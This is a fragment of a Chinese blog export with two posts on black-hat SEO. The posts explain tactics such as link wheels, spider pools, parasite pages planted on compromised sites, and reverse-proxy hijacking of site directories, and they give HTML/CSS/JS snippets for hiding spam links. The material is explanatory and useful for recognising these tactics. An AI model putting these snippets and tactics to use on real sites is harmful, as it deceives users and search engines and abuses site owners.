挂暗链（黑链）\n手法：利用CSS，利用DIV+JS，利用JS等\n作用：利用高权重网站外链来提升自身站点排名。\n详细参考：[黑帽SEO之暗链](http://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E6%9A%97%E9%93%BE/)\n#### 网站劫持\n分类：客户端劫持，服务端劫持，快照劫持等\n手法：一般利用js或者php、asp等代码，达到劫持网站，控制跳转以及网页效果呈现的目的。\n作用：利用高权重网站跳转来引流量。\n详细参考：[黑帽SEO之网页劫持](http://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E7%BD%91%E9%A1%B5%E5%8A%AB%E6%8C%81/)\n#### 利用高权重网站二级目录\n手法：将一些博彩网页放在高权重网站的二级目录之下。\n作用：提高网站排名，引流量。\n#### 利用高权重网站二级目录反向代理\n　 通过配置nginx/apache等，设置目录代理，将服务器上某个目录代理到自己搭建服务器上的某个目录。\n　 即浏览者在打开*http://thief.one/2016/*目录时，实际访问到的资源是自己服务器上的某个目录（目标服务器会去自己服务器上拿数据），这取决于nginx配置文件的写法。这种手法不需要修改目标服务器网站源码，只需要修改中间件配置文件，不易被删除，不易被发现。\n\n*持续更新.......*\n\n参考：黑帽SEO论坛、SEO实战密码","slug":"黑帽SEO之基础知识","published":1,"updated":"2017-02-14T01:12:03.339Z","layout":"post","photos":[],"link":"","_id":"ciz80dyc4001s3ofvex0v36oy","content":"<p>　 SEO全称为搜索引擎优化，是指通过站内优化、站外优化等方式，提升搜索引擎收录排名。既然有SEO技术，便会有相应的从业人员，他们被称为白帽SEO，专指通过公正SEO手法，帮助提升站点排名的专业人员。<br><a id=\"more\"></a>　 当然有白便会有黑，由于白帽SEO优化的过程将会十分漫长，一个新站想要获取好的排名，往往需要花上几年时间做优化推广。因此一些想要快速提升自身网站排名的小伙伴，便开始在SEO上研究作弊手法，从而诞生了黑帽SEO。黑帽SEO是指通过作弊手段，让站点快速提升排名的一类SEO技术，或者说是黑客技术，比如说：黑链（暗链）、站群、网站劫持、桥页等，黑帽SEO能够快速提升排名，但毕竟是违规作弊行为，容易被K。<br>　 白帽与黑帽的优缺点显而易见，换句话说两者皆不完美，因此便又诞生了灰帽SEO，介于两者之间，既不违规，又可以较快速的提升排名。由于项目需要，最近开始接触一些黑帽SEO的知识，在此总结分享，欢迎指正！</p>\n<h3 id=\"黑帽SEO基础概念\"><a href=\"#黑帽SEO基础概念\" class=\"headerlink\" title=\"黑帽SEO基础概念\"></a>黑帽SEO基础概念</h3><h4 id=\"域名\"><a href=\"#域名\" class=\"headerlink\" title=\"域名\"></a>域名</h4><p>概念：域名由两个或两个以上的词构成，中间由点号分隔开，最右边的那个词称为顶级域名。</p>\n<blockquote>\n<h5 id=\"顶级域名\"><a href=\"#顶级域名\" class=\"headerlink\" title=\"顶级域名\"></a>顶级域名</h5><p>我们接触的顶级域名又分为两类：<br>1.国家和地区顶级域名，目前200多个国家分配了顶级域名，例如中国是cn，日本是jp等；<br>2.国际顶级域名，例如表示工商企业的.com，表示网络提供商的.net，表示非盈利组织的.org等。</p>\n<h5 id=\"一级域名\"><a href=\"#一级域名\" class=\"headerlink\" title=\"一级域名\"></a>一级域名</h5><p>一级域名就是在com net org前加一级，比如：baidu.com，thief.one等。</p>\n<h5 id=\"二级域名\"><a href=\"#二级域名\" class=\"headerlink\" title=\"二级域名\"></a>二级域名</h5><p>news.baidu.com，tieba.baidu.com等都是二级域名。</p>\n</blockquote>\n<h4 id=\"泛站群\"><a href=\"#泛站群\" class=\"headerlink\" title=\"泛站群\"></a>泛站群</h4><h5 id=\"泛二级域名站群\"><a href=\"#泛二级域名站群\" class=\"headerlink\" title=\"泛二级域名站群\"></a>泛二级域名站群</h5><p><img src=\"/upload_image/20161009/2.png\" alt=\"\"><br>前提：在做域名解析的时候，选择了*<br>操作：进入服务器，可以借助泛二级域名建站工具，批量创建二级域名站点，从而实现站群的效果。</p>\n<h5 id=\"泛端口站群\"><a href=\"#泛端口站群\" class=\"headerlink\" title=\"泛端口站群\"></a>泛端口站群</h5><p><img src=\"/upload_image/20161009/1.png\" alt=\"\"><br>操作：先要获得操作目标站点的服务器权限，进入服务器之后，可以使用泛端口站群建设工具，批量创建泛端口站点。主要是在iis里面批量创建站点，绑定站点对应的端口。对于泛端口站点，一定要注意一些重要端口别占用了，否则可以导致服务器出错。一般泛站，用的比较多的是Dedecms程序。</p>\n<h4 id=\"站中站\"><a href=\"#站中站\" class=\"headerlink\" title=\"站中站\"></a>站中站</h4><p>　 就是在权重高的网站中创建一个自己的网站，其实就是添加很多外链，蜘蛛会认为这些网站也是属于高权重网站的内容，因此权重也会比较高。但是由于这种做法太泛滥，导致百度修改了爬虫算法。</p>\n<h4 id=\"链轮\"><a href=\"#链轮\" class=\"headerlink\" title=\"链轮\"></a>链轮</h4><p><img src=\"/upload_image/20161009/3.png\" alt=\"\"><br>　 Y是想要推广的网站，W是自己控制的外部网站，首先可以搞多个网站，一层层外链下去，形成链轮。当想要推广某个网站时，可以在所有外部网站上添加Y的外链。谷歌貌已经对此不友好，百度还可以尝试。</p>\n<h4 id=\"蜘蛛池\"><a href=\"#蜘蛛池\" class=\"headerlink\" title=\"蜘蛛池\"></a>蜘蛛池</h4><p>　 蜘蛛池是一种通过利用大型平台权重来获得搜索引擎收录以及排名的一种程序。原理可以理解为事先创建了一些站群，获取（豢养）了大量搜索引擎蜘蛛。当想要推广一个新的站点时，只需要将该站点以外链的形式添加到站群中，就能吸引蜘蛛爬取收录。</p>\n<h4 id=\"寄生虫\"><a href=\"#寄生虫\" class=\"headerlink\" title=\"寄生虫\"></a>寄生虫</h4><p>　 寄生虫是黑帽SEO常用的一种方法，通过侵入别人网站，植入寄生虫程序，自动生成各种非法页面。之所以叫做寄生虫是因为能够自己触发生成，而不是一次生成，例如在访问网页的时候触发，自动生成页面且形成链轮等。</p>\n<p><hr></p>\n<h3 id=\"黑帽SEO作弊手法\"><a href=\"#黑帽SEO作弊手法\" class=\"headerlink\" title=\"黑帽SEO作弊手法\"></a>黑帽SEO作弊手法</h3><p>SEO作弊手法不仅仅是为了提升网站排名，也有可能是为了陷害对手网站，降低其排名。</p>\n<h4 id=\"PR劫持\"><a href=\"#PR劫持\" class=\"headerlink\" title=\"PR劫持\"></a>PR劫持</h4><p>　 往往是利用301或者302跳转，因为搜索引擎在处理301，302跳转时，把目标URL当做实际收录的URL。<br>　 即当从A域名302到B域名，而B域名的PR值比较高时，域名A在更新PR值后，也会显示域名B的PR值，也就是说可以提升A的PR值。利用这一点，可以先将自己网站302跳转到一个PR高的网站，等PR值更新后，取消转向，放上自己的内容，这样可以维持到下一次PR值更新，大概两三个月的时间。</p>\n<h4 id=\"网站跳转\"><a href=\"#网站跳转\" class=\"headerlink\" title=\"网站跳转\"></a>网站跳转</h4><p>详细参考：<a href=\"http://thief.one/2016/10/10/%E9%BB%91%E5%B8%BDSEO%E2%80%94%E2%80%94%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BD%AC/\">黑帽SEO之页面跳转</a></p>\n<h4 id=\"隐藏页面\"><a href=\"#隐藏页面\" class=\"headerlink\" title=\"隐藏页面\"></a>隐藏页面</h4><p>　 隐藏页面指的是页面使用程序判断访问者是普通用户还是搜索引擎蜘蛛。如果是普通用户，程序返回一个不考虑SEO，只给用户看的页面；如果是搜索引擎蜘蛛，程序就返回一个高度优化的，但是由于优化后无法阅读的页面。</p>\n<h4 id=\"隐藏文字\"><a href=\"#隐藏文字\" class=\"headerlink\" title=\"隐藏文字\"></a>隐藏文字</h4><p>　 隐藏文字指的是网页上用户看不到，但搜索引擎能看到的文字，可以通过改变文字颜色，位置，大小等方式，代码：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;div style=<span class=\"string\">\"display:none\"</span>&gt;隐藏文字&lt;/div&gt;</div><div class=\"line\">positon:absolute;</div><div class=\"line\">margin-right:-1000000px;</div></pre></td></tr></table></figure></p>\n<h4 id=\"垃圾连接\"><a href=\"#垃圾连接\" class=\"headerlink\" title=\"垃圾连接\"></a>垃圾连接</h4><p>　 垃圾连接通常指站长为了提高网站排名，去各大论坛网站留言，留下自己的连接，一般通过群发软件完成这一操作。这种手法，容易被过滤掉，一些浏览器的插件或者博客的插件可以自动进行垃圾留言过滤。</p>\n<h4 id=\"连接农场\"><a href=\"#连接农场\" class=\"headerlink\" title=\"连接农场\"></a>连接农场</h4><p>　 链接农场指的是整个网站或者部分网页，没有实质内容，完全是为了交换链接而存在。该页面上全部是链接到其他网站，其他网站再链回来，互相交叉。</p>\n<h4 id=\"桥页\"><a href=\"#桥页\" class=\"headerlink\" title=\"桥页\"></a>桥页</h4><p>　 桥页也称为“门页”，此页面质量很低，充斥着关键字，完全以关键词排名与流量为目标，不考虑用户体验。当用户访问桥页，一般会有两种情况。</p>\n<ul>\n<li>页面顶部以大字号连接到其他网站（想要推广的网站），用户因为看不清桥页内容，有时不得不点击连接。</li>\n<li>利用页面自动跳转技术。</li>\n</ul>\n<h4 id=\"关键词堆积\"><a href=\"#关键词堆积\" class=\"headerlink\" title=\"关键词堆积\"></a>关键词堆积</h4><p>关键词堆积指的是在页面上本来没必要出现关键词的地方反复刻意堆积关键词，提高排名。</p>\n<h4 id=\"诱饵替换\"><a href=\"#诱饵替换\" class=\"headerlink\" title=\"诱饵替换\"></a>诱饵替换</h4><p>诱饵替换指的是作弊者先通过普通关键词制作页面获得排名后，更改为其他内容。</p>\n<h4 id=\"刷站\"><a href=\"#刷站\" class=\"headerlink\" title=\"刷站\"></a>刷站</h4><p>刷站是一种利用程序模拟用户用搜索引擎，搜索某个关键词，然后点击浏览某个网页的行为。</p>\n<h4 id=\"挂暗链（黑链）\"><a href=\"#挂暗链（黑链）\" class=\"headerlink\" title=\"挂暗链（黑链）\"></a>挂暗链（黑链）</h4><p>手法：利用CSS，利用DIV+JS，利用JS等<br>作用：利用高权重网站外链来提升自身站点排名。<br>详细参考：<a href=\"http://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E6%9A%97%E9%93%BE/\">黑帽SEO之暗链</a></p>\n<h4 id=\"网站劫持\"><a href=\"#网站劫持\" class=\"headerlink\" title=\"网站劫持\"></a>网站劫持</h4><p>分类：客户端劫持，服务端劫持，快照劫持等<br>手法：一般利用js或者php、asp等代码，达到劫持网站，控制跳转以及网页效果呈现的目的。<br>作用：利用高权重网站跳转来引流量。<br>详细参考：<a href=\"http://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E7%BD%91%E9%A1%B5%E5%8A%AB%E6%8C%81/\">黑帽SEO之网页劫持</a></p>\n<h4 id=\"利用高权重网站二级目录\"><a href=\"#利用高权重网站二级目录\" class=\"headerlink\" title=\"利用高权重网站二级目录\"></a>利用高权重网站二级目录</h4><p>手法：将一些博彩网页放在高权重网站的二级目录之下。<br>作用：提高网站排名，引流量。</p>\n<h4 id=\"利用高权重网站二级目录反向代理\"><a href=\"#利用高权重网站二级目录反向代理\" class=\"headerlink\" title=\"利用高权重网站二级目录反向代理\"></a>利用高权重网站二级目录反向代理</h4><p>　 通过配置nginx/apache等，设置目录代理，将服务器上某个目录代理到自己搭建服务器上的某个目录。<br>　 即浏览者在打开<em><a href=\"http://thief.one/2016/\">http://thief.one/2016/</a></em>目录时，实际访问到的资源是自己服务器上的某个目录（目标服务器会去自己服务器上拿数据），这取决于nginx配置文件的写法。这种手法不需要修改目标服务器网站源码，只需要修改中间件配置文件，不易被删除，不易被发现。</p>\n<p><em>持续更新…….</em></p>\n<p>参考：黑帽SEO论坛、SEO实战密码</p>\n","excerpt":"<p>　 SEO全称为搜索引擎优化，是指通过站内优化、站外优化等方式，提升搜索引擎收录排名。既然有SEO技术，便会有相应的从业人员，他们被称为白帽SEO，专指通过公正SEO手法，帮助提升站点排名的专业人员。<br>","more":"当然有白便会有黑，由于白帽SEO优化的过程将会十分漫长，一个新站想要获取好的排名，往往需要花上几年时间做优化推广。因此一些想要快速提升自身网站排名的小伙伴，便开始在SEO上研究作弊手法，从而诞生了黑帽SEO。黑帽SEO是指通过作弊手段，让站点快速提升排名的一类SEO技术，或者说是黑客技术，比如说：黑链（暗链）、站群、网站劫持、桥页等，黑帽SEO能够快速提升排名，但毕竟是违规作弊行为，容易被K。<br>　 白帽与黑帽的优缺点显而易见，换句话说两者皆不完美，因此便又诞生了灰帽SEO，介于两者之间，既不违规，又可以较快速的提升排名。由于项目需要，最近开始接触一些黑帽SEO的知识，在此总结分享，欢迎指正！</p>\n<h3 id=\"黑帽SEO基础概念\"><a href=\"#黑帽SEO基础概念\" class=\"headerlink\" title=\"黑帽SEO基础概念\"></a>黑帽SEO基础概念</h3><h4 id=\"域名\"><a href=\"#域名\" class=\"headerlink\" title=\"域名\"></a>域名</h4><p>概念：域名由两个或两个以上的词构成，中间由点号分隔开，最右边的那个词称为顶级域名。</p>\n<blockquote>\n<h5 id=\"顶级域名\"><a href=\"#顶级域名\" class=\"headerlink\" title=\"顶级域名\"></a>顶级域名</h5><p>我们接触的顶级域名又分为两类：<br>1.国家和地区顶级域名，目前200多个国家分配了顶级域名，例如中国是cn，日本是jp等；<br>2.国际顶级域名，例如表示工商企业的.com，表示网络提供商的.net，表示非盈利组织的.org等。</p>\n<h5 id=\"一级域名\"><a href=\"#一级域名\" class=\"headerlink\" title=\"一级域名\"></a>一级域名</h5><p>一级域名就是在com net org前加一级，比如：baidu.com，thief.one等。</p>\n<h5 id=\"二级域名\"><a href=\"#二级域名\" class=\"headerlink\" title=\"二级域名\"></a>二级域名</h5><p>news.baidu.com，tieba.baidu.com等都是二级域名。</p>\n</blockquote>\n<h4 id=\"泛站群\"><a href=\"#泛站群\" class=\"headerlink\" title=\"泛站群\"></a>泛站群</h4><h5 id=\"泛二级域名站群\"><a href=\"#泛二级域名站群\" class=\"headerlink\" title=\"泛二级域名站群\"></a>泛二级域名站群</h5><p><img src=\"/upload_image/20161009/2.png\" alt=\"\"><br>前提：在做域名解析的时候，选择了*<br>操作：进入服务器，可以借助泛二级域名建站工具，批量创建二级域名站点，从而实现站群的效果。</p>\n<h5 id=\"泛端口站群\"><a href=\"#泛端口站群\" class=\"headerlink\" title=\"泛端口站群\"></a>泛端口站群</h5><p><img src=\"/upload_image/20161009/1.png\" alt=\"\"><br>操作：先要获得操作目标站点的服务器权限，进入服务器之后，可以使用泛端口站群建设工具，批量创建泛端口站点。主要是在iis里面批量创建站点，绑定站点对应的端口。对于泛端口站点，一定要注意一些重要端口别占用了，否则可以导致服务器出错。一般泛站，用的比较多的是Dedecms程序。</p>\n<h4 id=\"站中站\"><a href=\"#站中站\" class=\"headerlink\" title=\"站中站\"></a>站中站</h4><p>　 就是在权重高的网站中创建一个自己的网站，其实就是添加很多外链，蜘蛛会认为这些网站也是属于高权重网站的内容，因此权重也会比较高。但是由于这种做法太泛滥，导致百度修改了爬虫算法。</p>\n<h4 id=\"链轮\"><a href=\"#链轮\" class=\"headerlink\" title=\"链轮\"></a>链轮</h4><p><img src=\"/upload_image/20161009/3.png\" alt=\"\"><br>　 Y是想要推广的网站，W是自己控制的外部网站，首先可以搞多个网站，一层层外链下去，形成链轮。当想要推广某个网站时，可以在所有外部网站上添加Y的外链。谷歌貌已经对此不友好，百度还可以尝试。</p>\n<h4 id=\"蜘蛛池\"><a href=\"#蜘蛛池\" class=\"headerlink\" title=\"蜘蛛池\"></a>蜘蛛池</h4><p>　 蜘蛛池是一种通过利用大型平台权重来获得搜索引擎收录以及排名的一种程序。原理可以理解为事先创建了一些站群，获取（豢养）了大量搜索引擎蜘蛛。当想要推广一个新的站点时，只需要将该站点以外链的形式添加到站群中，就能吸引蜘蛛爬取收录。</p>\n<h4 id=\"寄生虫\"><a href=\"#寄生虫\" class=\"headerlink\" title=\"寄生虫\"></a>寄生虫</h4><p>　 寄生虫是黑帽SEO常用的一种方法，通过侵入别人网站，植入寄生虫程序，自动生成各种非法页面。之所以叫做寄生虫是因为能够自己触发生成，而不是一次生成，例如在访问网页的时候触发，自动生成页面且形成链轮等。</p>\n<p><hr></p>\n<h3 id=\"黑帽SEO作弊手法\"><a href=\"#黑帽SEO作弊手法\" class=\"headerlink\" title=\"黑帽SEO作弊手法\"></a>黑帽SEO作弊手法</h3><p>SEO作弊手法不仅仅是为了提升网站排名，也有可能是为了陷害对手网站，降低其排名。</p>\n<h4 id=\"PR劫持\"><a href=\"#PR劫持\" class=\"headerlink\" title=\"PR劫持\"></a>PR劫持</h4><p>　 往往是利用301或者302跳转，因为搜索引擎在处理301，302跳转时，把目标URL当做实际收录的URL。<br>　 即当从A域名302到B域名，而B域名的PR值比较高时，域名A在更新PR值后，也会显示域名B的PR值，也就是说可以提升A的PR值。利用这一点，可以先将自己网站302跳转到一个PR高的网站，等PR值更新后，取消转向，放上自己的内容，这样可以维持到下一次PR值更新，大概两三个月的时间。</p>\n<h4 id=\"网站跳转\"><a href=\"#网站跳转\" class=\"headerlink\" title=\"网站跳转\"></a>网站跳转</h4><p>详细参考：<a href=\"http://thief.one/2016/10/10/%E9%BB%91%E5%B8%BDSEO%E2%80%94%E2%80%94%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BD%AC/\">黑帽SEO之页面跳转</a></p>\n<h4 id=\"隐藏页面\"><a href=\"#隐藏页面\" class=\"headerlink\" title=\"隐藏页面\"></a>隐藏页面</h4><p>　 隐藏页面指的是页面使用程序判断访问者是普通用户还是搜索引擎蜘蛛。如果是普通用户，程序返回一个不考虑SEO，只给用户看的页面；如果是搜索引擎蜘蛛，程序就返回一个高度优化的，但是由于优化后无法阅读的页面。</p>\n<h4 id=\"隐藏文字\"><a href=\"#隐藏文字\" class=\"headerlink\" title=\"隐藏文字\"></a>隐藏文字</h4><p>　 隐藏文字指的是网页上用户看不到，但搜索引擎能看到的文字，可以通过改变文字颜色，位置，大小等方式，代码：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;div style=<span class=\"string\">\"display:none\"</span>&gt;隐藏文字&lt;/div&gt;</div><div class=\"line\">positon:absolute;</div><div class=\"line\">margin-right:-1000000px;</div></pre></td></tr></table></figure></p>\n<h4 id=\"垃圾连接\"><a href=\"#垃圾连接\" class=\"headerlink\" title=\"垃圾连接\"></a>垃圾连接</h4><p>　 垃圾连接通常指站长为了提高网站排名，去各大论坛网站留言，留下自己的连接，一般通过群发软件完成这一操作。这种手法，容易被过滤掉，一些浏览器的插件或者博客的插件可以自动进行垃圾留言过滤。</p>\n<h4 id=\"连接农场\"><a href=\"#连接农场\" class=\"headerlink\" title=\"连接农场\"></a>连接农场</h4><p>　 链接农场指的是整个网站或者部分网页，没有实质内容，完全是为了交换链接而存在。该页面上全部是链接到其他网站，其他网站再链回来，互相交叉。</p>\n<h4 id=\"桥页\"><a href=\"#桥页\" class=\"headerlink\" title=\"桥页\"></a>桥页</h4><p>　 桥页也称为“门页”，此页面质量很低，充斥着关键字，完全以关键词排名与流量为目标，不考虑用户体验。当用户访问桥页，一般会有两种情况。</p>\n<ul>\n<li>页面顶部以大字号连接到其他网站（想要推广的网站），用户因为看不清桥页内容，有时不得不点击连接。</li>\n<li>利用页面自动跳转技术。</li>\n</ul>\n<h4 id=\"关键词堆积\"><a href=\"#关键词堆积\" class=\"headerlink\" title=\"关键词堆积\"></a>关键词堆积</h4><p>关键词堆积指的是在页面上本来没必要出现关键词的地方反复刻意堆积关键词，提高排名。</p>\n<h4 id=\"诱饵替换\"><a href=\"#诱饵替换\" class=\"headerlink\" title=\"诱饵替换\"></a>诱饵替换</h4><p>诱饵替换指的是作弊者先通过普通关键词制作页面获得排名后，更改为其他内容。</p>\n<h4 id=\"刷站\"><a href=\"#刷站\" class=\"headerlink\" title=\"刷站\"></a>刷站</h4><p>刷站是一种利用程序模拟用户用搜索引擎，搜索某个关键词，然后点击浏览某个网页的行为。</p>\n<h4 id=\"挂暗链（黑链）\"><a href=\"#挂暗链（黑链）\" class=\"headerlink\" title=\"挂暗链（黑链）\"></a>挂暗链（黑链）</h4><p>手法：利用CSS，利用DIV+JS，利用JS等<br>作用：利用高权重网站外链来提升自身站点排名。<br>详细参考：<a href=\"http://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E6%9A%97%E9%93%BE/\">黑帽SEO之暗链</a></p>\n<h4 id=\"网站劫持\"><a href=\"#网站劫持\" class=\"headerlink\" title=\"网站劫持\"></a>网站劫持</h4><p>分类：客户端劫持，服务端劫持，快照劫持等<br>手法：一般利用js或者php、asp等代码，达到劫持网站，控制跳转以及网页效果呈现的目的。<br>作用：利用高权重网站跳转来引流量。<br>详细参考：<a href=\"http://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E7%BD%91%E9%A1%B5%E5%8A%AB%E6%8C%81/\">黑帽SEO之网页劫持</a></p>\n<h4 id=\"利用高权重网站二级目录\"><a href=\"#利用高权重网站二级目录\" class=\"headerlink\" title=\"利用高权重网站二级目录\"></a>利用高权重网站二级目录</h4><p>手法：将一些博彩网页放在高权重网站的二级目录之下。<br>作用：提高网站排名，引流量。</p>\n<h4 id=\"利用高权重网站二级目录反向代理\"><a href=\"#利用高权重网站二级目录反向代理\" class=\"headerlink\" title=\"利用高权重网站二级目录反向代理\"></a>利用高权重网站二级目录反向代理</h4><p>　 通过配置nginx/apache等，设置目录代理，将服务器上某个目录代理到自己搭建服务器上的某个目录。<br>　 即浏览者在打开<em><a href=\"http://thief.one/2016/\">http://thief.one/2016/</a></em>目录时，实际访问到的资源是自己服务器上的某个目录（目标服务器会去自己服务器上拿数据），这取决于nginx配置文件的写法。这种手法不需要修改目标服务器网站源码，只需要修改中间件配置文件，不易被删除，不易被发现。</p>\n<p><em>持续更新…….</em></p>\n<p>参考：黑帽SEO论坛、SEO实战密码</p>"},{"title":"黑帽SEO之暗链","date":"2016-10-12T04:57:30.000Z","comments":1,"_content":"\n　　暗链也称为*黑链*，即隐蔽链接 hidden links，是黑帽SEO的作弊手法之一。在早期的SEO优化中，黑链是最有效最迅速的方法之一；但是现在百度算法已经对iframe和display:none 等直接进行了打击，如果你对代码没有任何处理的话，那么你所做的外链将全部降权。因此，目前黑帽SEO技术中，暗链已经用得不多，但还是有必要了解下这个经典的作弊手法。\n\n　　挂暗链的目的很简单，增加网站外链，提高网站排名；实现方式主要分为几种：利用CSS实现、利用JS实现、利用DIV+JS实现，其他高级手法。\n\n### 利用CSS实现挂暗链\n\n#### display属性\n将display属性设置为none，则页面上不显示此内容。\n```bash\n<div style=\"display:none;\">\n<a href=http://thief.one/ >暗链</a>\n</div>\n```\n分析：这种形式以前效果较好，现在不建议使用，易被搜索引擎察觉。\n\n#### color/font-size/line-height属性\n将color颜色设置与页面背景色一样，大小设置为小于或等于1。\n```bash\n<a href=http://thief.one style=\"color:#FFFFFF;font-size:1px;line-height:1px ;\">暗链</a>\n```\n分析：最初级的隐蔽链接，易被搜索引擎察觉。\n\n#### position属性\n将position位置属性设置成负数，使内容位于页面可见范围以外。\n```bash\n<div style=\"position: absolute; top: -999px;left: -999px;\"><a href=http://thief.one >暗链</a></div>\n```\n```bash\n<div style=\"position:absolute;left:expression_r(1-900);top:expression_r(3-999);\"><a href=http://thief.one >暗链</a></div>\n```\n分析：以上2种写法，都是将内容放到可见范围以外，容易被搜索引擎识别。\n\n#### marquee属性\n设置marquee滚动标签属性，使之快速闪现。\n```bash\n<marquee height=1 width=5 scrollamount=3000 scrolldelay=20000><a href=http://thief.one >暗链</a></marquee>\n```\n分析：链接以赛马灯形式迅速闪现，这种形式以前效果较好，现在不建议使用。\n\n### 利用JS实现挂暗链\n利用js向页面中写入css代码，设置属性。\n```bash\n<script language=\"javascript\" type=\"text/javascript\">\ndocument.write(\"<div style='display:none;'>\");\n</script><div>\n\n<a href=http://thief.one>暗链</a>\n\n<script language=\"javascript\" type=\"text/javascript\">\ndocument.write(\"</div>\");\n</script>\n```\n分析：js输出前面提到的css代码，到达一样的效果。目前来说Google对这种js形式的代码的内部实质意义还无法识别，但也不建议使用这种。\n\n### 利用DIV+JS实现挂暗链\n利用div与js功能，修改属性。\n```bash\n<div id=\"anlian\"><a href=\"http://thief.one\">暗链</a></div>\n<script language=javascript>\ndocument.getElementById(\"anlian\").style.display=\"none\"\n</script>\n```\n分析：这是一种DIV与JS结合做黑链的一种常见方法，蜘蛛一般不会读取script的内容，只会读取div里的链接，可是div的显示属性却被script修改了。\n\n### 挂暗链高级姿势\n```bash\n<div class=\"father\" style=\"position:relative\">\n　　<div class=\"topLever\" style=\"position:absolute;left:0;top:0;z-index:999; width:90%;height:100px;border:1px solid #333;background:#eee\">遮挡层：可以放图片或者Flash</div>\n　　<div class=\"hideDontent\">隐蔽层：可以放暗链链接</div>\n</div>\n```\n分析：这种方式一般是放在Flash、图片或者其它层对象下方。这个代码是用父层相对定位，子层用绝对定位固定住以用来遮挡下面的隐蔽层内的暗链内容。\n\n\n结语：*暗链不是什么新鲜的技术，但黑帽SEO始终在摸索前行，路漫漫其修远兮！*","source":"_posts/黑帽SEO之暗链.md","raw":"---\ntitle: 黑帽SEO之暗链\ndate: 2016-10-12 12:57:30\ncomments: true\ntags: 黑帽SEO\ncategories: 技术交流\n---\n\n　　暗链也称为*黑链*，即隐蔽链接 hidden links，是黑帽SEO的作弊手法之一。在早期的SEO优化中，黑链是最有效最迅速的方法之一；但是现在百度算法已经对iframe和display:none 等直接进行了打击，如果你对代码没有任何处理的话，那么你所做的外链将全部降权。因此，目前黑帽SEO技术中，暗链已经用得不多，但还是有必要了解下这个经典的作弊手法。\n\n　　挂暗链的目的很简单，增加网站外链，提高网站排名；实现方式主要分为几种：利用CSS实现、利用JS实现、利用DIV+JS实现，其他高级手法。\n\n### 利用CSS实现挂暗链\n\n#### display属性\n将display属性设置为none，则页面上不显示此内容。\n```bash\n<div style=\"display:none;\">\n<a href=http://thief.one/ >暗链</a>\n</div>\n```\n分析：这种形式以前效果较好，现在不建议使用，易被搜索引擎察觉。\n\n#### color/font-size/line-height属性\n将color颜色设置与页面背景色一样，大小设置为小于或等于1。\n```bash\n<a href=http://thief.one style=\"color:#FFFFFF;font-size:1px;line-height:1px ;\">暗链</a>\n```\n分析：最初级的隐蔽链接，易被搜索引擎察觉。\n\n#### position属性\n将position位置属性设置成负数，使内容位于页面可见范围以外。\n```bash\n<div style=\"position: absolute; top: -999px;left: -999px;\"><a href=http://thief.one >暗链</a></div>\n```\n```bash\n<div style=\"position:absolute;left:expression_r(1-900);top:expression_r(3-999);\"><a href=http://thief.one >暗链</a></div>\n```\n分析：以上2种写法，都是将内容放到可见范围以外，容易被搜索引擎识别。\n\n#### marquee属性\n设置marquee滚动标签属性，使之快速闪现。\n```bash\n<marquee height=1 width=5 scrollamount=3000 scrolldelay=20000><a href=http://thief.one >暗链</a></marquee>\n```\n分析：链接以赛马灯形式迅速闪现，这种形式以前效果较好，现在不建议使用。\n\n### 利用JS实现挂暗链\n利用js向页面中写入css代码，设置属性。\n```bash\n<script language=\"javascript\" type=\"text/javascript\">\ndocument.write(\"<div style='display:none;'>\");\n</script><div>\n\n<a href=http://thief.one>暗链</a>\n\n<script language=\"javascript\" type=\"text/javascript\">\ndocument.write(\"</div>\");\n</script>\n```\n分析：js输出前面提到的css代码，到达一样的效果。目前来说Google对这种js形式的代码的内部实质意义还无法识别，但也不建议使用这种。\n\n### 利用DIV+JS实现挂暗链\n利用div与js功能，修改属性。\n```bash\n<div id=\"anlian\"><a href=\"http://thief.one\">暗链</a></div>\n<script language=javascript>\ndocument.getElementById(\"anlian\").style.display=\"none\"\n</script>\n```\n分析：这是一种DIV与JS结合做黑链的一种常见方法，蜘蛛一般不会读取script的内容，只会读取div里的链接，可是div的显示属性却被script修改了。\n\n### 挂暗链高级姿势\n```bash\n<div class=\"father\" style=\"position:relative\">\n　　<div class=\"topLever\" style=\"position:absolute;left:0;top:0;z-index:999; width:90%;height:100px;border:1px solid #333;background:#eee\">遮挡层：可以放图片或者Flash</div>\n　　<div class=\"hideDontent\">隐蔽层：可以放暗链链接</div>\n</div>\n```\n分析：这种方式一般是放在Flash、图片或者其它层对象下方。这个代码是用父层相对定位，子层用绝对定位固定住以用来遮挡下面的隐蔽层内的暗链内容。\n\n\n结语：*暗链不是什么新鲜的技术，但黑帽SEO始终在摸索前行，路漫漫其修远兮！*","slug":"黑帽SEO之暗链","published":1,"updated":"2017-02-14T01:12:03.339Z","layout":"post","photos":[],"link":"","_id":"ciz80dyc8001w3ofvpsz5vpyx","content":"<p>　　暗链也称为<em>黑链</em>，即隐蔽链接 hidden links，是黑帽SEO的作弊手法之一。在早期的SEO优化中，黑链是最有效最迅速的方法之一；但是现在百度算法已经对iframe和display:none 等直接进行了打击，如果你对代码没有任何处理的话，那么你所做的外链将全部降权。因此，目前黑帽SEO技术中，暗链已经用得不多，但还是有必要了解下这个经典的作弊手法。</p>\n<p>　　挂暗链的目的很简单，增加网站外链，提高网站排名；实现方式主要分为几种：利用CSS实现、利用JS实现、利用DIV+JS实现，其他高级手法。</p>\n<h3 id=\"利用CSS实现挂暗链\"><a href=\"#利用CSS实现挂暗链\" class=\"headerlink\" title=\"利用CSS实现挂暗链\"></a>利用CSS实现挂暗链</h3><h4 id=\"display属性\"><a href=\"#display属性\" class=\"headerlink\" title=\"display属性\"></a>display属性</h4><p>将display属性设置为none，则页面上不显示此内容。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div 